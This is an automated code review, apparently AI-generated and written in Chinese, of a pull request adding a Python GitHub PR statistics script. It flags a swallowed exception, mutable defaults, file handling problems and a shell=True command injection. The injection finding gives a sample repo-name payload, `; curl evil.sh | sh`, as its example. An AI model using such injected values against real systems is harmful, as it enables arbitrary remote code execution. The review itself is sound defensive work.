<!-- deepseek-review -->
## 🤖 DeepSeek Code Review — 🛑 建議修改後再合併

這個 PR 新增了一支 `sandbox/pr_stats.py` 小工具，從 GitHub API 抓取 PR 資料並輸出 CSV。整體是實驗性腳本，但內含多個明確缺陷：`_fetch` 用裸 `except: pass` 吞掉所有錯誤（含 KeyboardInterrupt），且失敗時回傳 `None` 讓後續 `pr["user"]` 直接 TypeError；`collect_authors` 與 `threshold_from_env` 使用可變預設值造成跨呼叫共用狀態；`archive` 以 `shell=True` 拼接外部輸入（repo、path）構成命令注入。建議先修這三類問題再合併。

### Findings（6 筆）

| | Severity | 位置 | 問題 | 信心 |
|---|---|---|---|---|
| 🛑 | Blocker | `sandbox/pr_stats.py:23` | _fetch 裸 except 吞掉所有例外並回傳 None | 0.95 |
| 🛑 | Blocker | `sandbox/pr_stats.py:77` | archive 以 shell=True 拼接外部輸入，構成命令注入 | 0.90 |
| ⚠️ | Major | `sandbox/pr_stats.py:29` | collect_authors 使用可變預設參數 seen=[] | 0.85 |
| ⚠️ | Major | `sandbox/pr_stats.py:51` | threshold_from_env 使用可變預設 dict 並可能拋 ValueError | 0.85 |
| 🔸 | Minor | `sandbox/pr_stats.py:69` | export_csv 未使用 with，例外時檔案不會關閉 | 0.80 |
| 🔸 | Minor | `sandbox/pr_stats.py:40` | review_latency 假設 timeline 事件已排序且欄位存在 | 0.75 |

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/pr_stats.py:23</code> _fetch 裸 except 吞掉所有例外並回傳 None</summary>

`except:` 會連 `KeyboardInterrupt`、`SystemExit` 一起吃掉，且失敗時函式隱式回傳 `None`。呼叫端 `collect_authors` 與 `main` 直接使用 `pr["user"]["login"]`，一旦 API 回 404/401/rate limit 或網路逾時，就會在下一行丟出 `TypeError: 'NoneType' object is not subscriptable`，錯誤訊息完全指不到真正原因（token 失效、repo 不存在等）。

建議：改為 `except urllib.error.HTTPError as e:` / `except urllib.error.URLError as e:`，記錄 status 與 path 後 `raise`（或用 `raise RuntimeError(...) from e` 保留追蹤），不要靜默回傳 None。

**判斷依據**：diff 第 20-23 行：try 區塊內 `urllib.request.urlopen` 失敗會拋 HTTPError/URLError，卻被裸 except 吞掉且無 return，函式回傳 None；第 27 行 `seen.append(pr["user"]["login"])` 與第 84 行 `pr["user"]["login"]` 直接下標。

</details>

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/pr_stats.py:77</code> archive 以 shell=True 拼接外部輸入，構成命令注入</summary>

`subprocess.run(f"tar czf {path}.tgz {path} && gh repo view {repo}", shell=True)` 把 `path` 與 `repo` 直接內插進 shell 指令。`repo` 來自 `sys.argv[1]`（完全由使用者控制），`path` 由 `repo.replace('/', '-')` 衍生，因此只要傳入如 `tznthou/x; curl evil.sh | sh` 或含 `$(...)`、反引號、空白的 repo 名稱，就會在執行此腳本的機器上執行任意指令。

建議：改用參數陣列並關閉 shell，例如 `subprocess.run(["tar", "czf", f"{path}.tgz", path], check=True)` 與 `subprocess.run(["gh", "repo", "view", repo], check=True)`；同時對 `repo` 做白名單格式驗證（`^[\w.-]+/[\w.-]+$`）。

**判斷依據**：diff 第 74 行；`repo` 於第 78 行 `repo = sys.argv[1]` 取得，未經任何驗證即進入 shell 字串。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/pr_stats.py:29</code> collect_authors 使用可變預設參數 seen=[]</summary>

`def collect_authors(repo, numbers, seen=[]):` 的預設 list 只在函式定義時建立一次，跨呼叫共用。任何一次呼叫（含未來新增的呼叫端）都會把作者累積進同一個 list，第二次呼叫會拿到前一次的殘留資料，導致 `main` 印出的 `len(authors)` 與 CSV 內容不一致且隨執行次數膨脹。

建議：改為 `def collect_authors(repo, numbers, seen=None):` 並在函式內 `if seen is None: seen = []`。

**判斷依據**：diff 第 26 行；函式內第 29 行 `seen.append(...)` 會就地修改該預設物件。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/pr_stats.py:51</code> threshold_from_env 使用可變預設 dict 並可能拋 ValueError</summary>

`def threshold_from_env(default={"days": 7}):` 的預設 dict 跨呼叫共用，呼叫端若修改回傳值會污染後續所有呼叫的預設值。此外 `int(raw)` 直接轉換環境變數，若 `PR_STALE_DAYS` 被設成非數字（例如 `7d`、空字串以外的任意字串），會拋出未處理的 `ValueError` 使整個腳本中斷。

建議：`default=None` 並在函式內建立新 dict；`int(raw)` 包在 try/except ValueError 中，失敗時記錄警告並回退預設值。

**判斷依據**：diff 第 52 行；第 55 行 `return {"days": int(raw)}` 直接轉換外部環境變數。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/pr_stats.py:69</code> export_csv 未使用 with，例外時檔案不會關閉</summary>

`f = open(path, "w")` 之後若 `f.write` 因磁碟滿、編碼錯誤或 `r['author']` 含特殊字元而拋例外，`f.close()` 不會被執行，檔案 handle 洩漏且緩衝內容可能未 flush。

建議：改用 `with open(path, "w", newline="") as f:`，並考慮用 `csv` 模組處理欄位中的逗號/換行跳脫。

**判斷依據**：diff 第 67 行；第 73 行才 `f.close()`，中間的 write 迴圈沒有 finally 保護。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/pr_stats.py:40</code> review_latency 假設 timeline 事件已排序且欄位存在</summary>

`events[0]` 與 `events[-1]` 直接取頭尾，但 GitHub timeline API 回傳順序不保證，且並非每個事件都有 `created_at`（例如某些事件型別）。若最後一個事件缺少 `created_at`，`_to_epoch` 會拋 `KeyError`；若順序非時間序，算出的 latency 可能為負值。

建議：過濾出含 `created_at` 的事件後再取 `min`/`max`，或明確排序後再計算。

**判斷依據**：diff 第 38 行；第 39 行 `last = events[-1]["created_at"]`，兩者皆未驗證鍵是否存在或順序。

</details>

---

<sub>model `deepseek-flash` ｜ prompt tokens 3231 (cache hit 3072) ｜ completion tokens 1752</sub>